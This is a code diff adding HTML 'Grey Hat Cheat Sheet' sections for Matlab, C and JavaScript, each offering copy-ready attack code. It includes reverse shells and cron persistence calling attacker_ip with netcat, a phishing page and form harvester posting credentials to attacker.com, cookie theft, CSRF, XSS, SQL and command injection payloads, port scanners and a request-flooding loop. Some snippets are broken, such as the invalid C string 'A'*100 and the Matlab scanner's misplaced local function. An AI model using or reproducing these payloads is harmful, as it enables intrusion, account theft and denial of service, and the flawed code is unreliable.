@@ -507,6 +507,522 @@ print("Fake login page created!")
 
     </div>
   </div>
+          <!-- c-->
+            <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">Matlab Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- Port Scanning -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Advanced Port Scanning in Matlab</h3>
+        <p class="text-gray-200 mb-2">Scan a range of ports with Matlab using `tcpclient` and `parfor` for concurrency.</p>
+        <div class="code-block">
+          <pre id="advanced_port_scan_matlab">
+% Advanced Port Scanning in Matlab
+target_ip = 'target_ip';
+ports = 1:1024; % Port range to scan
+
+% Function to check if a port is open
+function check_port(port)
+    try
+        t = tcpclient(target_ip, port, 'Timeout', 1);
+        disp(['Port ' num2str(port) ' is open']);
+    catch
+        disp(['Port ' num2str(port) ' is closed']);
+    end
+end
+
+% Scan ports using parallel execution
+parfor port = ports
+    check_port(port);
+end
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('advanced_port_scan_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Packet Sniffing -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Packet Sniffing in Matlab</h3>
+        <p class="text-gray-200 mb-2">Capture network traffic using Matlab's `tcpclient` and `udp` objects.</p>
+        <div class="code-block">
+          <pre id="packet_sniff_matlab">
+% Packet Sniffing in Matlab
+udp_obj = udp('0.0.0.0', 'LocalPort', 12345); % Listen on port 12345
+fopen(udp_obj);
+disp('Listening for packets...');
+
+while true
+    data = fscanf(udp_obj);
+    disp(['Received data: ' data]);
+end
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('packet_sniff_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Web Application Attacks</h2>
+
+      <!-- SQL Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">SQL Injection Simulation in Matlab</h3>
+        <p class="text-gray-200 mb-2">Simulate an SQL injection by injecting payloads into SQL queries.</p>
+        <div class="code-block">
+          <pre id="sql_injection_matlab">
+% SQL Injection Simulation in Matlab
+url = 'http://target.com/login';
+username = ''' OR 1=1 --';
+password = 'anything';
+
+% Send POST request with SQL payload
+data = webwrite(url, 'username', username, 'password', password);
+
+% Check if SQL injection is successful
+if contains(data, 'Welcome')
+    disp('SQL injection successful');
+else
+    disp('SQL injection failed');
+end
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('sql_injection_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Command Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection in Matlab</h3>
+        <p class="text-gray-200 mb-2">Inject system commands into vulnerable web applications.</p>
+        <div class="code-block">
+          <pre id="command_injection_matlab">
+% Command Injection in Matlab
+url = 'http://target.com/command_exec';
+payload = 'id; ls'; % Command injection payload
+
+% Send POST request with the injected command
+response = webwrite(url, 'command', payload);
+
+% Check for command injection
+if contains(response, 'uid')
+    disp('Command injection successful');
+else
+    disp('Injection failed');
+end
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Post-Exploitation Techniques</h2>
+
+      <!-- Privilege Escalation -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Privilege Escalation via Matlab</h3>
+        <p class="text-gray-200 mb-2">Attempt to escalate privileges by checking for sudo rights.</p>
+        <div class="code-block">
+          <pre id="sudo_privilege_escalation_matlab">
+% Privilege Escalation via Matlab
+[status, cmdout] = system('sudo -l'); % Check sudo permissions
+disp('Sudo Permissions:');
+disp(cmdout);
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('sudo_privilege_escalation_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Cron Job Persistence -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Persistence via Cron Jobs</h3>
+        <p class="text-gray-200 mb-2">Set a reverse shell to execute periodically using cron jobs.</p>
+        <div class="code-block">
+          <pre id="cron_job_persistence_matlab">
+% Add reverse shell to cron job in Matlab
+reverse_shell = '*/5 * * * * nc -e /bin/bash attacker_ip 4444';
+
+% Add cron job
+[status, cmdout] = system(['echo "' reverse_shell '" | crontab -']);
+disp('Cron job added for persistence');
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('cron_job_persistence_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Social Engineering</h2>
+
+      <!-- Phishing Attack -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Phishing Attack with Fake Login Page</h3>
+        <p class="text-gray-200 mb-2">Create a fake login page to collect user credentials.</p>
+        <div class="code-block">
+          <pre id="phishing_page_matlab">
+% Phishing Attack: Fake Login Page
+fake_login = '''
+<html>
+  <head><title>Login Page</title></head>
+  <body>
+    <h2>Login</h2>
+    <form action="http://attacker.com/collect" method="POST">
+      <input type="text" name="username" placeholder="Username"><br>
+      <input type="password" name="password" placeholder="Password"><br>
+      <input type="submit" value="Login">
+    </form>
+  </body>
+</html>
+''';
+
+% Save fake login page to HTML file
+fid = fopen('fake_login.html', 'w');
+fprintf(fid, fake_login);
+fclose(fid);
+disp('Fake login page created');
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('phishing_page_matlab')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
+          <!-- matlab -->
+            <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">C Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">Buffer Overflow Attacks</h2>
+
+      <!-- Simple Buffer Overflow -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Simple Buffer Overflow in C</h3>
+        <p class="text-gray-200 mb-2">A simple example of buffer overflow that can be used to overwrite memory and cause crashes or execute code.</p>
+        <div class="code-block">
+          <pre id="simple_buffer_overflow_c">
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input); // Vulnerable to buffer overflow
+}
+
+int main() {
+    char malicious_input[] = "A"*100; // Overwrite buffer
+    vulnerable_function(malicious_input);
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('simple_buffer_overflow_c')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- Reverse Shell -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Reverse Shell in C</h3>
+        <p class="text-gray-200 mb-2">A reverse shell connects back to an attacker's machine to provide remote access.</p>
+        <div class="code-block">
+          <pre id="reverse_shell_c">
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    const char *host = "attacker_ip"; // Attacker's IP
+    const int port = 4444; // Port to connect back to
+
+    char command[256];
+    snprintf(command, sizeof(command), "nc %s %d -e /bin/bash", host, port);
+
+    system(command); // Execute the reverse shell
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('reverse_shell_c')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Port Scanning -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Port Scanning in C</h3>
+        <p class="text-gray-200 mb-2">Scan a range of ports on a target IP using raw socket programming.</p>
+        <div class="code-block">
+          <pre id="port_scan_c">
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+int scan_port(const char *target_ip, int port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = inet_addr(target_ip);
+    server.sin_port = htons(port);
+
+    int connection = connect(sock, (struct sockaddr *)&server, sizeof(server));
+    if (connection == -1) {
+        return 0; // Port is closed
+    }
+    return 1; // Port is open
+}
+
+int main() {
+    const char *target_ip = "target_ip";
+    for (int port = 1; port <= 1024; port++) {
+        if (scan_port(target_ip, port)) {
+            printf("Port %d is open\n", port);
+        } else {
+            printf("Port %d is closed\n", port);
+        }
+    }
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('port_scan_c')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Privilege Escalation</h2>
+
+      <!-- Sudo Privilege Escalation -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Sudo Privilege Escalation in C</h3>
+        <p class="text-gray-200 mb-2">Use a C program to check if a user has sudo privileges.</p>
+        <div class="code-block">
+          <pre id="sudo_privilege_escalation_c">
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    // Run sudo -l to check for privileges
+    system("sudo -l");
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('sudo_privilege_escalation_c')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Cron Job Persistence -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Persistence via Cron Jobs</h3>
+        <p class="text-gray-200 mb-2">Add a reverse shell to cron jobs for persistent access to the system.</p>
+        <div class="code-block">
+          <pre id="cron_job_persistence_c">
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    const char *reverse_shell = "*/5 * * * * nc -e /bin/bash attacker_ip 4444"; // Reverse shell in cron
+    char command[256];
+    snprintf(command, sizeof(command), "echo '%s' | crontab -", reverse_shell);
+    system(command);
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('cron_job_persistence_c')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Web Application Attacks</h2>
+
+      <!-- SQL Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">SQL Injection Simulation in C</h3>
+        <p class="text-gray-200 mb-2">Simulate SQL injection in a vulnerable C web application.</p>
+        <div class="code-block">
+          <pre id="sql_injection_c">
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+    char sql_injection[] = "' OR 1=1 --"; // SQL Injection payload
+    char url[256];
+
+    snprintf(url, sizeof(url), "http://target.com/login?username=%s", sql_injection);
+    printf("Attacking with URL: %s\n", url);
+    // Send the URL to the vulnerable application
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('sql_injection_c')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Command Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection in C</h3>
+        <p class="text-gray-200 mb-2">Inject system commands into vulnerable applications in C.</p>
+        <div class="code-block">
+          <pre id="command_injection_c">
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    const char *command_injection = "id; ls"; // Command injection payload
+    char command[256];
+
+    snprintf(command, sizeof(command), "http://target.com/execute?cmd=%s", command_injection);
+    printf("Attacking with command: %s\n", command);
+    system(command); // Execute the injected command
+    return 0;
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection_c')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
+  <!-- javascript-->
+  <code>
+      <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">JavaScript Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">Cross-Site Scripting (XSS)</h2>
+
+      <!-- Basic XSS Attack -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Basic XSS Attack in JavaScript</h3>
+        <p class="text-gray-200 mb-2">Injecting a script to execute malicious actions in the victim's browser.</p>
+        <div class="code-block">
+          <pre id="basic_xss_js">
+<script>
+  alert('XSS Attack!');
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('basic_xss_js')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- DOM-based XSS -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">DOM-based XSS in JavaScript</h3>
+        <p class="text-gray-200 mb-2">Manipulating the DOM to execute malicious scripts.</p>
+        <div class="code-block">
+          <pre id="dom_xss_js">
+<script>
+  let user_input = window.location.hash.substring(1);
+  document.getElementById("output").innerHTML = user_input; // Vulnerable to XSS
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dom_xss_js')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Web Application Attacks</h2>
+
+      <!-- Cross-Site Request Forgery (CSRF) -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">CSRF Attack in JavaScript</h3>
+        <p class="text-gray-200 mb-2">Using malicious scripts to trigger actions on a website that the victim is authenticated to.</p>
+        <div class="code-block">
+          <pre id="csrf_js">
+<script>
+  let img = new Image();
+  img.src = "http://victim.com/change-password?new_password=attackerpassword";
+  document.body.appendChild(img); // Sends request as victim
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('csrf_js')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- HTTP Request Sniffing -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">HTTP Request Sniffing using JavaScript</h3>
+        <p class="text-gray-200 mb-2">Intercepting HTTP requests and modifying headers or payloads in transit.</p>
+        <div class="code-block">
+          <pre id="http_sniffing_js">
+<script>
+  let xhr = new XMLHttpRequest();
+  xhr.open("GET", "http://victim.com/secret-data", true);
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      console.log(xhr.responseText); // Malicious script reads sensitive data
+    }
+  };
+  xhr.send();
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('http_sniffing_js')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Privilege Escalation</h2>
+
+      <!-- Cookie Theft via JavaScript -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Cookie Theft with JavaScript</h3>
+        <p class="text-gray-200 mb-2">Stealing authentication cookies to hijack a session.</p>
+        <div class="code-block">
+          <pre id="cookie_theft_js">
+<script>
+  document.location = "http://attacker.com/steal?cookie=" + document.cookie;
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('cookie_theft_js')" class="copy-btn">Copy</button>
+      </div>
+
+      <!-- Credential Harvesting -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Credential Harvesting with JavaScript</h3>
+        <p class="text-gray-200 mb-2">Capturing usernames and passwords submitted through a form.</p>
+        <div class="code-block">
+          <pre id="credential_harvest_js">
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    let username = document.getElementById('username').value;
+    let password = document.getElementById('password').value;
+    fetch('http://attacker.com/harvest', {
+      method: 'POST',
+      body: JSON.stringify({ username, password }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+  });
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('credential_harvest_js')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Denial of Service (DoS)</h2>
+
+      <!-- DoS via JavaScript -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Denial of Service (DoS) using JavaScript</h3>
+        <p class="text-gray-200 mb-2">Overloading the victim's browser or server with excessive requests.</p>
+        <div class="code-block">
+          <pre id="dos_js">
+<script>
+  function dosAttack() {
+    while (true) {
+      fetch('http://victim.com');
+    }
+  }
+  dosAttack(); // Launches infinite requests
+</script>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dos_js')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
+  </code>
       </main>
     </div>
   </div>
